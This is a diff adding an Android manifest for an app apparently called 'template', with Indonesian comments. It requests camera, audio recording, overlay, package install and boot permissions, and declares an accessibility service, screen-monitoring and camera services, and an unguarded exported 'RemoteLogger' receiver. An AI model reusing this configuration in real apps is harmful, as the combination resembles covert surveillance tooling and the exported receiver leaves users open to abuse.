@@ -1,0 +1,238 @@
+<?xml version='1.0' encoding='utf-8'?>
+<manifest
+    xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.github.template"
+    android:installLocation="internalOnly">
+
+    <!--ukur kapasitas penyimpanan aplikasi.-->
+    <uses-permission android:name="android.permission.GET_PACKAGE_SIZE"/>
+
+    <!--hapus semua data memori aplikasi.-->
+    <uses-permission android:name="android.permission.CLEAR_APP_CACHE"/>
+
+    <!--dijalankan saat dimulai-->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+
+    <!--REQUEST_DELETE_PACKAGES-->
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES"/>
+
+    <!--langsung instal aplikasi.-->
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+
+    <!--akses penuh Internet.-->
+    <uses-permission android:name="android.permission.INTERNET"/>
+
+    <!--lihat status jaringan.-->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+
+    <!--lihat status Wi-Fi.-->
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+
+    <!--ganti konektivitas jaringan.-->
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+
+    <!--sambung dan putuskan Wi-Fi-->
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+
+    <!--baca konten kartu SD Anda-->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+
+    <!--mengubah atau menghapus konten kartu SD Anda-->
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+
+    <!--Bolehkan penerimaan multicast Wi-Fi-->
+    <uses-permission android:name="android.permission.CHANGE_WIFI_MULTICAST_STATE"/>
+
+    <!--kontrol penggetar.-->
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    
+   <!--Ambil gambar dan video-->
+    <uses-permission android:name="android.permission.CAMERA"/>
+
+    <!--Rekam audio-->
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+
+    <!--tutup aplikasi lain-->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+
+  
+    <uses-feature
+        android:name="android.hardware.camera"
+        android:required="true"/>
+
+    <uses-feature
+        android:name="android.hardware.camera.front"
+        android:required="false"/>
+
+    <uses-feature
+        android:name="android.hardware.camera.autofocus"
+        android:required="false"/>
+    
+    <uses-feature android:name="android.hardware.wifi"/>
+    
+    <!--RECEIVE_BROADCAST-->
+    <uses-permission android:name="com.github.template.RECEIVE_BROADCAST"/>
+    
+    <permission android:name="com.github.template.RECEIVE_BROADCAST"/>
+
+    <supports-screens
+        android:anyDensity="true"
+        android:largeScreens="true"
+        android:normalScreens="true"
+        android:resizeable="true"
+        android:smallScreens="true"
+        android:xlargeScreens="true"/>
+
+    <application
+        android:name=".AppController"
+        android:allowBackup="true"
+        android:fullBackupContent="true"
+        android:icon="@drawable/ic_launcher"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:label="@string/app_name"
+        android:theme="@style/AppTheme"
+        android:supportsRtl="true"
+        android:resizeableActivity="false">
+
+        <activity
+            android:name=".SplashActivity"
+            android:label="@string/app_name"
+            android:theme="@style/AppTheme.Splash">
+
+            <intent-filter>
+
+                <action android:name="android.intent.action.MAIN"/>
+
+                <category android:name="android.intent.category.LAUNCHER"/>
+
+            </intent-filter>
+
+        </activity>
+
+        <activity
+            android:name=".application.ApplicationActivity"
+            android:label="@string/app_name"
+            android:theme="@style/AppTheme.NoActionBar">
+
+            <intent-filter>
+
+                <action android:name="android.intent.action.MAIN"/>
+
+                <category android:name="android.intent.category.DEFAULT"/>
+
+            </intent-filter>
+
+        </activity>
+
+        <activity
+            android:name=".application.ApplicationInfoActivity"
+            android:label="@string/app_name"
+            android:theme="@style/AppTheme.NoActionBar"
+            android:parentActivityName=".application.ApplicationActivity"
+            android:configChanges="keyboardHidden|orientation|screenSize">
+
+            <meta-data
+                android:name="android.support.PARENT_ACTIVITY"
+                android:value=".application.ApplicationActivity"/>
+        </activity>
+
+        <activity
+            android:name=".application.ViewManifestActivity"
+            android:label="@string/app_name"
+            android:theme="@style/AppTheme.NoActionBar"
+            android:configChanges="keyboardHidden|orientation|screenSize"/>
+
+        <activity
+            android:name=".application.MonitorActivity"
+            android:label="@string/app_name"
+            android:theme="@style/AppTheme.NoActionBar"
+            android:parentActivityName=".application.ApplicationActivity"
+            android:configChanges="keyboardHidden|orientation|screenSize">
+
+            <meta-data
+                android:name="android.support.PARENT_ACTIVITY"
+                android:value=".application.ApplicationActivity"/>
+
+            
+        </activity>
+
+        <activity
+            android:name=".application.SettingsActivity"
+            android:exported="false"
+            android:label="@string/settings"
+            android:parentActivityName=".application.ApplicationActivity">
+            <meta-data
+                android:name="android.support.PARENT_ACTIVITY"
+                android:value=".application.ApplicationActivity"/>
+            <intent-filter>
+
+                <category android:name="android.intent.category.PREFERENCE"/>
+
+            </intent-filter>
+        </activity>
+
+        <activity
+            android:name=".application.ScreenSharePreference"
+            android:exported="false"
+            android:label="@string/settings"
+            android:parentActivityName=".application.ApplicationActivity">
+            <meta-data
+                android:name="android.support.PARENT_ACTIVITY"
+                android:value=".application.ApplicationActivity"/>
+            <intent-filter>
+
+                <category android:name="android.intent.category.PREFERENCE"/>
+
+            </intent-filter>
+        </activity>
+        <receiver android:name=".receiver.BootCompleteReceiver">
+            <intent-filter>
+
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".receiver.RemoteLogger"
+            android:enabled="true"
+            android:exported="true"/>
+        
+        <service
+            android:name=".service.CleanerService"
+            android:exported="false"/>
+
+        <service
+            android:name=".service.ReceiverService"
+            android:label="@string/accessibility_service_label"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:description="@string/app_receiver_service_description"
+            android:process=":receiver_service">
+            <intent-filter>
+
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+
+            </intent-filter>
+        </service>
+  
+        <service
+            android:name=".service.MonitorScreenService"
+            android:exported="false"
+            android:process=":service"/>
+
+        <service
+            android:name=".service.ForegroundService"
+            android:exported="false"/>
+
+        <service
+            android:name=".service.CameraService"
+            android:enabled="true"
+            android:exported="false"/>
+        
+        <meta-data
+            android:name="android.max_aspect"
+            android:value="4.0"/>
+
+    </application>
+
+</manifest>
